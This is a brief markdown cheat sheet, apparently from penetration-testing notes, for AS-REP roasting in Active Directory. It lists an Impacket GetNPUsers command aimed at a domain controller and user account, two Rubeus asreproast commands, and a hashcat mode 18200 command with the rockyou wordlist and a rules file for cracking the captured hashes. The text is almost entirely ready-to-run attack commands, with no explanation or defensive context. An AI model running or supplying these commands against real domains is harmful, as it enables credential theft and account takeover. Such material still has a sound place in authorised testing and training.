# AS-REP Roasting

### Impacket AS-REP Roasting

```markdown
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
```

### Using Rubeus

```markdown
.\Rubeus.exe asreproast /outfile:asrep.txt

.\Rubeus.exe asreproast /nowrap
```

Cracking hash

sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force